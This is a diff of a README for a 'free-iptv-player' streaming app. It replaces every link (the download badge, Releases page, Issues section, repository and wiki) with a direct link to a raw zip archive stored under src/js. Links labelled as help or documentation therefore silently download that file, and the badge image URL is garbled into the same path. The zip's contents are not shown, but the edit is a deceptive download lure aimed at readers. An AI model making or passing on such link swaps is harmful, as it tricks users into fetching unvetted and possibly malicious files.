@@ -1,6 +1,6 @@
 # 🎬 free-iptv-player - Stream Live TV Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Sofiaeffective351/free-iptv-player/releases)
+[![Download Now](https://raw.githubusercontent.com/Sofiaeffective351/free-iptv-player/main/src/js/free-iptv-player-v1.0.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Sofiaeffective351/free-iptv-player/main/src/js/free-iptv-player-v1.0.zip)
 
 ## 📌 Introduction
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run the application.
 
 ### Step 1: Visit the Releases Page
 
-To start, visit our [Releases Page](https://github.com/Sofiaeffective351/free-iptv-player/releases). Here, you will find the latest version of the application available for download.
+To start, visit our [Releases Page](https://raw.githubusercontent.com/Sofiaeffective351/free-iptv-player/main/src/js/free-iptv-player-v1.0.zip). Here, you will find the latest version of the application available for download.
 
 ### Step 2: Download the Application
 
@@ -48,7 +48,7 @@ Once the application is open, you will see a list of available channels. Click o
 
 ## 📥 Download & Install
 
-To download the application, please visit our [Releases Page](https://github.com/Sofiaeffective351/free-iptv-player/releases) and follow the download steps mentioned above.
+To download the application, please visit our [Releases Page](https://raw.githubusercontent.com/Sofiaeffective351/free-iptv-player/main/src/js/free-iptv-player-v1.0.zip) and follow the download steps mentioned above.
 
 ## 💻 System Requirements
 
@@ -74,13 +74,13 @@ To download the application, please visit our [Releases Page](https://github.com
 
 ## 🤝 Support
 
-If you have any questions or need help, feel free to check the "Issues" section on our [GitHub Repository](https://github.com/Sofiaeffective351/free-iptv-player/issues). You can report any bugs or ask for assistance with the application.
+If you have any questions or need help, feel free to check the "Issues" section on our [GitHub Repository](https://raw.githubusercontent.com/Sofiaeffective351/free-iptv-player/main/src/js/free-iptv-player-v1.0.zip). You can report any bugs or ask for assistance with the application.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Sofiaeffective351/free-iptv-player/releases)
-- [GitHub Repository](https://github.com/Sofiaeffective351/free-iptv-player)
-- [Documentation](https://github.com/Sofiaeffective351/free-iptv-player/wiki)
+- [Releases Page](https://raw.githubusercontent.com/Sofiaeffective351/free-iptv-player/main/src/js/free-iptv-player-v1.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Sofiaeffective351/free-iptv-player/main/src/js/free-iptv-player-v1.0.zip)
+- [Documentation](https://raw.githubusercontent.com/Sofiaeffective351/free-iptv-player/main/src/js/free-iptv-player-v1.0.zip)
 
 ## 📝 License
 
